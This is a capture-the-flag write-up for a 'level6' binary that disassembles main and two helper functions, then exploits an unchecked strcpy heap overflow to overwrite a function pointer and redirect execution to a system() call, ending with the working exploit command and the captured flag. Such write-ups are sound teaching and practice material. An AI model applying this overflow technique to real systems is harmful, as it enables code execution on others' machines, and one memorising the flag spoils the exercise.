<span style="display: flex; justify-content: space-between;"><span style="text-align: left; display: block;">
	[← level5](../level5/solution.md)
</span>
<span style="text-align: center; display: block;">
	[Home](../README.md)
</span>
<span style="text-align: right; display: block;">
	[level7 →](../level7/solution.md)
</span>
</span>

level6
======

Dissassembly
------------

To dissassemble the executable we can use objdump.
```sh
EXECUTABLE=./level6

objdump -M intel -d "$EXECUTABLE"
```

The main function looks like this:
```nasm
0804847c <main>:
 804847c:	55                   	push   ebp
 804847d:	89 e5                	mov    ebp,esp
 804847f:	83 e4 f0             	and    esp,0xfffffff0
 8048482:	83 ec 20             	sub    esp,0x20
 8048485:	c7 04 24 40 00 00 00 	mov    DWORD PTR [esp],0x40
 804848c:	e8 bf fe ff ff       	call   8048350 <malloc@plt>
 8048491:	89 44 24 1c          	mov    DWORD PTR [esp+0x1c],eax
 8048495:	c7 04 24 04 00 00 00 	mov    DWORD PTR [esp],0x4
 804849c:	e8 af fe ff ff       	call   8048350 <malloc@plt>
 80484a1:	89 44 24 18          	mov    DWORD PTR [esp+0x18],eax
 80484a5:	ba 68 84 04 08       	mov    edx,0x8048468
 80484aa:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 80484ae:	89 10                	mov    DWORD PTR [eax],edx
 80484b0:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 80484b3:	83 c0 04             	add    eax,0x4
 80484b6:	8b 00                	mov    eax,DWORD PTR [eax]
 80484b8:	89 c2                	mov    edx,eax
 80484ba:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 80484be:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 80484c2:	89 04 24             	mov    DWORD PTR [esp],eax
 80484c5:	e8 76 fe ff ff       	call   8048340 <strcpy@plt>
 80484ca:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 80484ce:	8b 00                	mov    eax,DWORD PTR [eax]
 80484d0:	ff d0                	call   eax
 80484d2:	c9                   	leave
 80484d3:	c3                   	ret
```

We can see two calls to malloc.
One is of size 0x40 and will contain a copy of the first argument:
```nasm
...
 8048485:   c7 04 24 40 00 00 00    mov    DWORD PTR [esp],0x40
 804848c:   e8 bf fe ff ff          call   8048350 <malloc@plt>
 8048491:   89 44 24 1c             mov    DWORD PTR [esp+0x1c],eax
...
 80484b0:   8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 80484b3:   83 c0 04                add    eax,0x4
 80484b6:   8b 00                   mov    eax,DWORD PTR [eax]
 80484b8:   89 c2                   mov    edx,eax
 80484ba:   8b 44 24 1c             mov    eax,DWORD PTR [esp+0x1c]
 80484be:   89 54 24 04             mov    DWORD PTR [esp+0x4],edx
 80484c2:   89 04 24                mov    DWORD PTR [esp],eax
 80484c5:   e8 76 fe ff ff          call   8048340 <strcpy@plt>
...
```

The second one is of size 0x04 and will contain a function pointer that will be executed.
```nasm
 8048495:   c7 04 24 04 00 00 00    mov    DWORD PTR [esp],0x4
 804849c:   e8 af fe ff ff          call   8048350 <malloc@plt>
 80484a1:   89 44 24 18             mov    DWORD PTR [esp+0x18],eax
...
 80484a5:   ba 68 84 04 08          mov    edx,0x8048468
 80484aa:   8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
 80484ae:   89 10                   mov    DWORD PTR [eax],edx
...
 80484ca:   8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
 80484ce:   8b 00                   mov    eax,DWORD PTR [eax]
 80484d0:   ff d0                   call   eax
```

This is the function located at the address 0x8048468:
```nasm
08048468 <m>:
 8048468:	55                   	push   ebp
 8048469:	89 e5                	mov    ebp,esp
 804846b:	83 ec 18             	sub    esp,0x18
 804846e:	c7 04 24 d1 85 04 08 	mov    DWORD PTR [esp],0x80485d1
 8048475:	e8 e6 fe ff ff       	call   8048360 <puts@plt>
 804847a:	c9                   	leave
 804847b:	c3                   	ret
```

There also is another function n, which uses a system call to run a shell:
```nasm
08048454 <n>:
 8048454:	55                   	push   ebp
 8048455:	89 e5                	mov    ebp,esp
 8048457:	83 ec 18             	sub    esp,0x18
 804845a:	c7 04 24 b0 85 04 08 	mov    DWORD PTR [esp],0x80485b0
 8048461:	e8 0a ff ff ff       	call   8048370 <system@plt>
 8048466:	c9                   	leave
 8048467:	c3                   	ret
```

Exploitation
------------

```sh
man strcpy
```

```
SECURITY CONSIDERATIONS
     The strcpy() function is easily misused in a manner which enables malicious users to arbitrarily change a running program's functionality through a buffer overflow attack.
```

Because strcpy is unsafe and there is no length check on the source string, we can overflow the destination and reach the next allocation, which happens to be the function pointer.

Through trial and error adding multiple of 4 to the destination buffer's size 64, we can overwrite the function pointer.
```sh
./level6 "$(printf '%.0sA' {1..72}; printf '%s' $'\x54\x84\x04\x08')"
```
```
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
